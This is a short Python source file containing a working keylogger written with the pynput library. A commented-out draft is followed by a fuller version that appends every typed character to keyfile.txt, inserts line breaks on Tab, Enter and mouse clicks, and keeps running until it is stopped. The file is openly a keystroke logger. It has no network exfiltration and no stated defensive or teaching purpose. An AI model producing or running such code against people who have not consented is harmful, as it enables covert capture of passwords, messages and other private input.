# from pynput import keyboard


# def keyPressed(key):
#     print(str(key))
#     with open("keyfile.txt", 'a') as logKey:
#         try:
#             char = key.char
#             logKey.write(char)
#         except:
#             print("Error getting char")


# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keyPressed)
#     listener.start()
#     input()

from pynput import keyboard, mouse


def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Check for special keys to insert a newline
            if key == keyboard.Key.tab or key == keyboard.Key.enter:
                logKey.write('\n')
            else:
                # For regular key presses, record the character
                char = key.char
                logKey.write(char)
        except AttributeError:
            # This block executes for special keys that don't have a char attribute
            print("Special key pressed: ", key)
        except Exception as e:
            print("Error logging key: ", str(e))


def on_click(x, y, button, pressed):
    # Log a newline on mouse click
    if pressed:
        with open("keyfile.txt", 'a') as logKey:
            logKey.write('\n')


if __name__ == "__main__":
    # Start keyboard listener
    keyboard_listener = keyboard.Listener(on_press=keyPressed)
    keyboard_listener.start()

    # Start mouse listener
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    # Keep the script running until manually stopped
    keyboard_listener.join()
    mouse_listener.join()
